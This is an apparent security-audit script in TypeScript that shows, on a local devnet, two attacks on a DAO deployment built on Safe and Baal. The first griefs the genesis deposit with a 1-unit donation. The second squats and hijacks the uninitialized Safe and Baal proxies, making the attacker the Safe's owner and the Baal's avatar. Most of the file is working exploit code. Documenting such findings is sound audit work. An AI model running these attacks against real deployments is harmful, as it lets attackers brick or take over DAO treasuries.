/**
 * Component 6, rows OPS-03 / OPS-04: the window between the Safe proxy creation and the genesis
 * deposit, and Baal/Safe singleton reuse. (a) Zero-supply trap: 1 unit (0.000001 USDC) sent to the
 * Safe before the genesis deposit makes genesisDeposit refuse, every later deposit quote 0 shares
 * (ZeroShares) and no proposal sponsorable: the deployment is dead. Counts the transactions in the
 * window. (b) Proxy squatting: the Safe and Baal proxy addresses depend only on (singleton, salt),
 * not on the deployer, and both proxies are created uninitialized: an attacker can create them, or
 * call Safe.setup / Baal.setUp on them, between our transactions; our deployment aborts.
 * Expected: trap terminal (demonstrated); squat aborts deployment with no fund movement (demonstrated).
 */
import { encodeFunctionData, getAddress, zeroAddress } from "viem";

import { createBaalProxy, createSafeProxy, deployBaalInfrastructure, loadBaalArtifact, loadLocalArtifact } from "../../../src/baal.js";
import { startDevnet, stopDevnet } from "../../../src/devnet.js";
import { connectDevnet, deployLocal, writeAndWait } from "../../../src/onchain.js";
import { DEFAULT_PARAMS, deployZeroOne, GENESIS_DEPOSIT, genesisDeposit } from "../../../src/zeroOne.js";
import { deployAudit, mustRevert } from "./lib-audit.js";

/** Hard assertion printing the check. */
function ok(condition: unknown, message: string): asserts condition {
  if (!condition) throw new Error(`ASSERTION FAILED: ${message}`);
  console.log(`   ok: ${message}`);
}

export async function main(): Promise<void> {
  const devnet = await startDevnet(`audit-ops03-${Date.now()}`, { hardfork: "prague" });
  let passed = false;
  try {
    const chain = connectDevnet(devnet);
    const deployer = chain.contexts[0]!;
    const attacker = chain.contexts[9]!;
    const tokenAbi = loadLocalArtifact("TestToken").abi;
    const sharesAbi = loadLocalArtifact("NavShareToken").abi;
    const depositAbi = loadLocalArtifact("DepositShaman").abi;
    const baalAbi = loadBaalArtifact("Baal").abi;

    console.log("\n== (a) zero-supply trap: 1 USDC unit lands in the Safe inside the deploy window");
    const dao = await deployZeroOne(deployer, { ...DEFAULT_PARAMS, founder: deployer.account.address });
    const order = Object.keys(dao.txHashes);
    const window = order.length - order.indexOf("SafeProxy") - 1;
    console.log(`   deployment transactions after SafeProxy creation and before the genesis deposit: ${window} (+2 for approve/deposit) = ${window + 2} transactions ~ ${(window + 2) * 2} s of Base blocks at 2 s each, before any RPC latency`);
    console.log(`   order: ${order.join(" > ")}`);
    // The attacker (anyone who saw the SafeProxy creation on chain) sends 1 unit to the Safe.
    await writeAndWait(deployer, { address: dao.settlement, abi: tokenAbi, functionName: "transfer", args: [attacker.account.address, 1_000_000n] });
    const griefHash = await attacker.walletClient.writeContract({ address: dao.settlement, abi: tokenAbi, functionName: "transfer", args: [dao.safe, 1n], account: attacker.account, chain: attacker.chain });
    const griefReceipt = await chain.publicClient.waitForTransactionReceipt({ hash: griefHash });
    console.log(`   attacker sent 1 unit (0.000001 USDC) to the predicted Safe ${dao.safe}: tx ${griefHash} gas ${griefReceipt.gasUsed}`);
    await mustRevert(genesisDeposit(deployer, dao, GENESIS_DEPOSIT), "genesisDeposit refuses (treasury != 0)");
    const quote = await chain.publicClient.readContract({ address: dao.depositShaman, abi: depositAbi, functionName: "quote", args: [50n * 10n ** 6n] }) as bigint;
    ok(quote === 0n, `DepositShaman.quote(50 USDC) = ${quote} shares (supply 0, treasury 1 unit)`);
    await writeAndWait(deployer, { address: dao.settlement, abi: tokenAbi, functionName: "approve", args: [dao.depositShaman, 10n ** 12n] });
    await mustRevert(chain.publicClient.simulateContract({ address: dao.depositShaman, abi: depositAbi, functionName: "deposit", args: [1_000_000n * 10n ** 6n], account: deployer.account }), "deposit of 1,000,000 USDC reverts ZeroShares");
    const supply = await chain.publicClient.readContract({ address: dao.shares, abi: sharesAbi, functionName: "totalSupply" }) as bigint;
    ok(supply === 0n, "totalSupply = 0: nobody can sponsor (threshold 1e18 > 0 shares)");
    await mustRevert(chain.publicClient.simulateContract({ address: dao.baal, abi: baalAbi, functionName: "sponsorProposal", args: [1], account: deployer.account }), "sponsorProposal by the founder (!sponsor)");
    console.log(`   verdict: DAO dead; attacker cost = 1 unit + ${griefReceipt.gasUsed} gas; our loss = the deployment gas (${order.length} tx) and the address set; repeatable for every redeploy since the Safe address is public ${window + 2} tx before genesis`);

    console.log("\n== (b) proxy squatting: Safe/Baal proxy addresses are (singleton, salt)-only; the uninitialized proxies accept anyone's setup");
    const infra = await deployBaalInfrastructure(deployer);
    const safeFactory = loadBaalArtifact("GnosisSafeProxyFactory");
    const moduleFactory = loadBaalArtifact("ModuleProxyFactory");
    const safeSingletonAbi = loadBaalArtifact("GnosisSafe").abi;
    // Predict from the deployer's point of view.
    const predictedSafe = getAddress((await chain.publicClient.simulateContract({ address: infra.safeProxyFactory, abi: safeFactory.abi, functionName: "createProxyWithNonce", args: [infra.safeSingleton, "0x", DEFAULT_PARAMS.salt * 2n], account: deployer.account })).result as string);
    // The attacker creates the same proxy (same factory, singleton, salt): identical address, and Safe.setup with its own owner.
    const squatHash = await attacker.walletClient.writeContract({ address: infra.safeProxyFactory, abi: safeFactory.abi, functionName: "createProxyWithNonce", args: [infra.safeSingleton, "0x", DEFAULT_PARAMS.salt * 2n], account: attacker.account, chain: attacker.chain });
    const squatReceipt = await chain.publicClient.waitForTransactionReceipt({ hash: squatHash });
    const created = squatReceipt.logs.find((log) => log.address.toLowerCase() === infra.safeProxyFactory.toLowerCase());
    const squattedSafe = created ? getAddress(`0x${created.data.slice(26, 66)}`) : zeroAddress;
    ok(squattedSafe === predictedSafe, `attacker created the Safe proxy at OUR predicted address ${predictedSafe} (gas ${squatReceipt.gasUsed})`);
    const setupHash = await attacker.walletClient.writeContract({ address: predictedSafe, abi: safeSingletonAbi, functionName: "setup", args: [[attacker.account.address], 1n, zeroAddress, "0x", zeroAddress, zeroAddress, 0n, zeroAddress], account: attacker.account, chain: attacker.chain });
    await chain.publicClient.waitForTransactionReceipt({ hash: setupHash });
    const owners = await chain.publicClient.readContract({ address: predictedSafe, abi: safeSingletonAbi, functionName: "getOwners" }) as string[];
    ok(owners.length === 1 && owners[0]!.toLowerCase() === attacker.account.address.toLowerCase(), `attacker is the sole owner of the Safe at our predicted address`);
    await mustRevert(createSafeProxy(deployer, infra, DEFAULT_PARAMS.salt * 2n), "our createSafeProxy at the same salt reverts (Create2 call failed)");
    // Baal proxy: same story through ModuleProxyFactory.deployModule(singleton, avatar(), 3).
    const initializer = encodeFunctionData({ abi: baalAbi, functionName: "avatar" });
    const baalSquat = await attacker.walletClient.writeContract({ address: infra.moduleProxyFactory, abi: moduleFactory.abi, functionName: "deployModule", args: [infra.baalSingleton, initializer, DEFAULT_PARAMS.salt * 2n + 1n], account: attacker.account, chain: attacker.chain });
    await chain.publicClient.waitForTransactionReceipt({ hash: baalSquat });
    await mustRevert(createBaalProxy(deployer, infra, DEFAULT_PARAMS.salt * 2n + 1n), "our createBaalProxy at the same salt reverts (TakenAddress)");
    // Even without squatting the creation, setUp on our own uninitialized Baal proxy is open to anyone until we call it.
    const ours = await createBaalProxy(deployer, infra, 99n);
    const fakeInit = encodeFunctionData({ abi: baalAbi, functionName: "setUp", args: [encodeFunctionData({ abi: baalAbi, functionName: "avatar" })] });
    void fakeInit;
    const lootAbi = loadLocalArtifact("LootToken").abi;
    const shares = await deployLocal(attacker, "NavShareToken", ["x", "x", ours.baal, attacker.account.address, dao.settlement]);
    const loot = await deployLocal(attacker, "LootToken", ["x", "x", ours.baal]);
    void lootAbi;
    const { encodeAbiParameters } = await import("viem");
    const fakeAvatar = await deployAudit(attacker, "FakeAvatar");
    const params = encodeAbiParameters([{ type: "address" }, { type: "address" }, { type: "address" }, { type: "address" }, { type: "address" }, { type: "bytes" }], [loot.address, shares.address, infra.multiSend, fakeAvatar.address, zeroAddress, encodeFunctionData({ abi: loadBaalArtifact("MultiSend").abi, functionName: "multiSend", args: ["0x"] })]);
    const hijack = await attacker.walletClient.writeContract({ address: ours.baal, abi: baalAbi, functionName: "setUp", args: [params], account: attacker.account, chain: attacker.chain });
    await chain.publicClient.waitForTransactionReceipt({ hash: hijack });
    const avatar = await chain.publicClient.readContract({ address: ours.baal, abi: baalAbi, functionName: "avatar" }) as string;
    ok(avatar.toLowerCase() === fakeAvatar.address.toLowerCase(), `attacker initialized OUR Baal proxy ${ours.baal} with avatar = the attacker FakeAvatar ${fakeAvatar.address} (tx ${hijack})`);
    console.log("   consequence: deployZeroOne's initializeSafeAndBaal would revert ('Initializable: contract is already initialized' / GS200) and abort before genesis: griefing only, no USDC moved; but the DAO's published/predicted addresses are burned each time");
    passed = true;
  } finally {
    console.log(`\n=== OPS-03/04 pre-genesis-window: ${passed ? "PASS (findings demonstrated)" : "FAIL"} ===`);
    await stopDevnet(devnet);
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
